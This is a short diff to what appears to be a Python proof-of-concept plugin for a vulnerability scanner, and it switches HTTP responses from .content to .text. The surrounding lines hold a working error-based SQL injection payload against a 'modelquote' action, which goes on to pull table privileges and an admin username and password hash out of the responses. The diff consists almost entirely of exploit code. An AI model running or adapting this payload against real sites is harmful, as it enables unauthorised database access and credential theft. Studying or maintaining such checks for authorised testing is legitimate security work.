@@ -51,7 +51,7 @@ class Poc(ABPoc):
             payload = '?action=modelquote&cid=1&name=spacecomments,(SELECT 3284 FROM(SELECT COUNT(*),CONCAT(CH' \
                       'AR(58,105,99,104,58),(MID((IFNULL(CAST(md5(160341893519135) AS CHAR),CHAR(32))),1,50)),' \
                       'CHAR(58,107,111,117,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)'
-            content = requests.get(verify_url + payload).content
+            content = requests.get(verify_url + payload).text
 
             if '3c6b20b60b3f57247420047ab16d3d71' in content:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
@@ -77,7 +77,7 @@ class Poc(ABPoc):
             match_table_priv = re.compile(':rge:(.*)access:nbs:1')
             try:
                 table_priv = match_table_priv.findall(
-                    requests.get(verify_url + payload_table_priv).content)[0]
+                    requests.get(verify_url + payload_table_priv).text)[0]
             except:
                 pass
 
@@ -89,7 +89,7 @@ class Poc(ABPoc):
             match_result = re.compile(':rge:(.*)::([\w\d]{32}):nbs:')
             try:
                 username, password = match_result.findall(
-                    requests.get(verify_url + payload).content)[0]
+                    requests.get(verify_url + payload).text)[0]
             except:
                 pass
 
